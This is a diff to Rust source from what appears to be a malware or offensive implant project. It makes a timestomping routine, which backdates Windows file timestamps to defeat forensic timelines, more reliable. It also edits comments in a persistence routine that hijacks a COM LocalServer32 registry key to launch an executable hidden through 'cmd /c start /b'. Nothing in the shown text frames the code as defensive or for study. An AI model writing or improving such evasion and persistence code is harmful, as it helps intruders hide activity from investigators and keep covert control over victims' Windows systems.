@@ -217,16 +217,30 @@ fn timestomp_file(path: &Path) {
         .unwrap_or_default()
         .as_secs();
 
-    let target_time = now - (days_ago as u64 * 24 * 60 * 60);
-    let windows_time = (target_time + 11644473600) * 10_000_000;
+    let target_time = now.saturating_sub(days_ago as u64 * 24 * 60 * 60);
+    // Use checked arithmetic to prevent overflow
+    let windows_time = target_time
+        .checked_add(11644473600)
+        .and_then(|t| t.checked_mul(10_000_000))
+        .unwrap_or(0);
+
+    // If we couldn't calculate a valid time, skip timestomping
+    if windows_time == 0 {
+        return;
+    }
 
     let filetime = FILETIME {
         dwLowDateTime: windows_time as u32,
         dwHighDateTime: (windows_time >> 32) as u32,
     };
 
+    // Validate path conversion before proceeding
+    let path_str = match path.to_str() {
+        Some(s) if !s.is_empty() => s,
+        _ => return, // Invalid path, skip timestomping
+    };
+
     unsafe {
-        let path_str = path.to_str().unwrap_or("");
         let wide_path: Vec<u16> = OsStr::new(path_str)
             .encode_wide()
             .chain(std::iter::once(0))
@@ -481,7 +495,8 @@ fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
     // This causes the executable to be launched when the COM object is instantiated
     let reg_key_localserver = format!("{}\\LocalServer32", reg_key_base);
 
-    // Use cmd /c start /b for background hidden execution
+    // For COM hijacking, use cmd wrapper for hidden background execution
+    // This is different from registry Run persistence which uses explorer.exe
     let launch_cmd = format!(r#"cmd /c start /b "" "{}""#, exe_str);
 
     let output2 = Command::new(&reg_exe)
